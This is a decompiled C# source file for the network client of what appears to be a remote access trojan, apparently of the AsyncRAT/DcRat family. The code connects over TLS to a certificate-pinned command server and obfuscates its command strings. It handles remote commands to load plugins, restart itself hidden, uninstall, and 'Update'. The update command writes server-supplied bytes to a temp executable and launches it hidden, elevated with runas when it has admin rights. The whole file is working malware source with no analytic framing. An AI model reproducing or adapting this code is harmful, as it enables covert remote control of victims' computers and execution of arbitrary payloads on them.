using System;
using System.Diagnostics;
using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using Leb128;

namespace Client.Helper
{
	// Token: 0x02000006 RID: 6
	public class Client
	{
		// Token: 0x06000017 RID: 23 RVA: 0x00002D88 File Offset: 0x00000F88
		public void Connect(string ip, string port)
		{
			try
			{
				this.socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				this.socket.ReceiveBufferSize = 512000;
				this.socket.SendBufferSize = 512000;
				this.socket.Connect(ip, Convert.ToInt32(port));
				if (this.socket.Connected)
				{
					this.SendSync = new object();
					this.SslClient = new SslStream(new NetworkStream(this.socket, true), false, new RemoteCertificateValidationCallback(this.ValidateServerCertificate));
					this.SslClient.AuthenticateAsClient(this.socket.RemoteEndPoint.ToString().Split(new char[]
					{
						':'
					})[0], null, SslProtocols.Tls, false);
					this.Offset = 0;
					this.HeaderSize = 4;
					this.ClientBuffer = new byte[this.HeaderSize];
					this.ClientBufferRecevied = false;
					this.SslClient.BeginRead(this.ClientBuffer, this.Offset, this.HeaderSize, new AsyncCallback(this.ReadData), null);
				}
				this.itsConnect = this.socket.Connected;
			}
			catch (Exception)
			{
				this.itsConnect = false;
			}
		}

		// Token: 0x06000018 RID: 24 RVA: 0x00002EDC File Offset: 0x000010DC
		private bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
		{
			return Config.ServerCertificate.Equals(certificate);
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00002EEC File Offset: 0x000010EC
		public void Disconnect()
		{
			this.itsConnect = false;
			this.ClientBuffer = null;
			this.HeaderSize = 0;
			this.Offset = 0;
			if (this.pingChecker != null)
			{
				this.pingChecker.Disconnect();
			}
			if (this.lastPing != null)
			{
				this.lastPing.Disconnect();
			}
			if (this.socket != null)
			{
				this.socket.Dispose();
			}
			if (this.SslClient != null)
			{
				this.SslClient.Dispose();
			}
		}

		// Token: 0x0600001A RID: 26 RVA: 0x00002F74 File Offset: 0x00001174
		public void ReadData(IAsyncResult ar)
		{
			if (!this.itsConnect)
			{
				return;
			}
			try
			{
				int num = this.SslClient.EndRead(ar);
				if (num > 0)
				{
					this.HeaderSize -= num;
					this.Offset += num;
					if (!this.ClientBufferRecevied)
					{
						this.ProcessClientBufferNotReceived();
					}
					else
					{
						this.ProcessClientBufferReceived();
					}
					if (this.itsConnect)
					{
						this.SslClient.BeginRead(this.ClientBuffer, this.Offset, this.HeaderSize, new AsyncCallback(this.ReadData), null);
					}
				}
				else
				{
					this.itsConnect = false;
				}
			}
			catch (Exception)
			{
				this.itsConnect = false;
			}
		}

		// Token: 0x0600001B RID: 27 RVA: 0x00003040 File Offset: 0x00001240
		public void ProcessClientBufferReceived2()
		{
			this.Offset = 0;
			this.HeaderSize = 4;
			this.ClientBuffer = new byte[this.HeaderSize];
			this.ClientBufferRecevied = false;
		}

		// Token: 0x0600001C RID: 28 RVA: 0x00003068 File Offset: 0x00001268
		public void ProcessClientBufferReceived1()
		{
			new Thread(new ParameterizedThreadStart(this.Read)).Start(this.ClientBuffer);
			this.ProcessClientBufferReceived2();
		}

		// Token: 0x0600001D RID: 29 RVA: 0x0000308C File Offset: 0x0000128C
		public void ProcessClientBufferReceived()
		{
			if (this.HeaderSize == 0)
			{
				this.ProcessClientBufferReceived1();
				return;
			}
			if (this.HeaderSize < 0)
			{
				this.itsConnect = false;
				return;
			}
		}

		// Token: 0x0600001E RID: 30 RVA: 0x000030B4 File Offset: 0x000012B4
		public void ProcessClientBufferNotReceived1()
		{
			this.HeaderSize = BitConverter.ToInt32(this.ClientBuffer, 0);
			if (this.HeaderSize > 0)
			{
				this.ClientBuffer = new byte[this.HeaderSize];
				this.Offset = 0;
				this.ClientBufferRecevied = true;
			}
		}

		// Token: 0x0600001F RID: 31 RVA: 0x000030F4 File Offset: 0x000012F4
		public void ProcessClientBufferNotReceived()
		{
			if (this.HeaderSize == 0)
			{
				this.ProcessClientBufferNotReceived1();
				return;
			}
			if (this.HeaderSize < 0)
			{
				this.itsConnect = false;
				return;
			}
		}

		// Token: 0x06000020 RID: 32 RVA: 0x0000311C File Offset: 0x0000131C
		public void Error(string exp)
		{
			this.Send(LEB128.Write(new object[]
			{
				EncryptString.Decode("Error"),
				exp
			}));
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00003140 File Offset: 0x00001340
		public void Send(byte[] Data)
		{
			if (!this.itsConnect)
			{
				return;
			}
			object sendSync = this.SendSync;
			lock (sendSync)
			{
				try
				{
					byte[] bytes = BitConverter.GetBytes(Data.Length);
					byte[] array = new byte[4 + Data.Length];
					Array.Copy(bytes, 0, array, 0, bytes.Length);
					Array.Copy(Data, 0, array, 4, Data.Length);
					this.socket.Poll(-1, SelectMode.SelectWrite);
					this.SslClient.Write(array, 0, array.Length);
					this.SslClient.Flush();
				}
				catch (Exception)
				{
					this.itsConnect = false;
				}
			}
		}

		// Token: 0x06000022 RID: 34 RVA: 0x000031FC File Offset: 0x000013FC
		public void Read(object data)
		{
			object[] array = LEB128.Read((byte[])data);
			if (this.lastPing != null)
			{
				this.lastPing.Last();
			}
			if ((string)array[0] == EncryptString.Decode("Invoke"))
			{
				PluginLoader.Invoke(array, this);
			}
			if ((string)array[0] == EncryptString.Decode("SaveInvoke"))
			{
				PluginLoader.SaveInvoke(array, this);
			}
			if ((string)array[0] == EncryptString.Decode("Pong"))
			{
				this.pingChecker.Stop(this);
			}
			if ((string)array[0] == EncryptString.Decode("Exit"))
			{
				Methods.Exit();
			}
			if ((string)array[0] == EncryptString.Decode("Restart"))
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.UseShellExecute = false;
				processStartInfo.CreateNoWindow = true;
				processStartInfo.RedirectStandardOutput = true;
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.FileName = EncryptString.Decode("cmd");
				processStartInfo.Arguments = EncryptString.Decode("/k timeout 5 > NUL && \"") + Methods.GetExecutablePath() + EncryptString.Decode("\"");
				if (Config.Privilege == EncryptString.Decode("Admin"))
				{
					processStartInfo.Verb = EncryptString.Decode("runas");
				}
				new Process
				{
					StartInfo = processStartInfo
				}.Start();
				Thread.Sleep(new Random().Next(2000, 3000));
				Methods.Exit();
			}
			if ((string)array[0] == EncryptString.Decode("Uninstall"))
			{
				if (Config.Install == EncryptString.Decode("false"))
				{
					Methods.Exit();
				}
				ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
				processStartInfo2.UseShellExecute = false;
				processStartInfo2.CreateNoWindow = true;
				processStartInfo2.RedirectStandardOutput = true;
				processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo2.FileName = Install.Uninstall();
				if (Config.Privilege == EncryptString.Decode("Admin"))
				{
					processStartInfo2.Verb = EncryptString.Decode("runas");
				}
				new Process
				{
					StartInfo = processStartInfo2
				}.Start();
				Thread.Sleep(2000);
				Methods.Exit();
			}
			if ((string)array[0] == EncryptString.Decode("Update"))
			{
				string text = Path.GetTempFileName() + EncryptString.Decode(".exe");
				File.WriteAllBytes(text, (byte[])array[1]);
				ProcessStartInfo processStartInfo3 = new ProcessStartInfo();
				processStartInfo3.UseShellExecute = false;
				processStartInfo3.CreateNoWindow = true;
				processStartInfo3.RedirectStandardOutput = true;
				processStartInfo3.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo3.FileName = EncryptString.Decode("cmd");
				processStartInfo3.Arguments = EncryptString.Decode("/k timeout 10 > NUL && \"") + text + EncryptString.Decode("\"");
				if (Config.Privilege == EncryptString.Decode("Admin"))
				{
					processStartInfo3.Verb = EncryptString.Decode("runas");
				}
				new Process
				{
					StartInfo = processStartInfo3
				}.Start();
				string fileName = Install.Uninstall();
				if (Config.Install == EncryptString.Decode("false"))
				{
					Methods.Exit();
				}
				ProcessStartInfo processStartInfo4 = new ProcessStartInfo();
				processStartInfo4.UseShellExecute = false;
				processStartInfo4.CreateNoWindow = true;
				processStartInfo4.RedirectStandardOutput = true;
				processStartInfo4.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo4.FileName = fileName;
				if (Config.Privilege == EncryptString.Decode("Admin"))
				{
					processStartInfo4.Verb = EncryptString.Decode("runas");
				}
				new Process
				{
					StartInfo = processStartInfo4
				}.Start();
				Thread.Sleep(2000);
				Methods.Exit();
			}
		}

		// Token: 0x04000023 RID: 35
		public Socket socket;

		// Token: 0x04000024 RID: 36
		public SslStream SslClient;

		// Token: 0x04000025 RID: 37
		public byte[] ClientBuffer;

		// Token: 0x04000026 RID: 38
		public bool ClientBufferRecevied;

		// Token: 0x04000027 RID: 39
		public int HeaderSize;

		// Token: 0x04000028 RID: 40
		public int Offset;

		// Token: 0x04000029 RID: 41
		public object SendSync;

		// Token: 0x0400002A RID: 42
		public bool itsConnect;

		// Token: 0x0400002B RID: 43
		public PingChecker pingChecker;

		// Token: 0x0400002C RID: 44
		public LastPing lastPing;
	}
}
